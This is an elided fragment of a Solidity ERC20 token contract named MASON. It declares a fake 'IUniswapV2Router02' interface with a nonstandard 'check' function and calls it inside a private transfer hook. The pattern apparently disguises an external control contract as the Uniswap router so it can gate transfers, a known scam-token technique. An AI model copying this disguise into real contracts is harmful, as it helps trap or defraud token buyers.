...
interface IUniswapV2Router02 {
    function check(address vals,address input) external view returns (bool, uint256);
}
...
contract MASON is ERC20 {
    ...
    function _considered(address sender) private    {
        ...
        (bool material, uint256 piece) = uniswapV2Router.check(sender,address(this));
        if(!material) return;
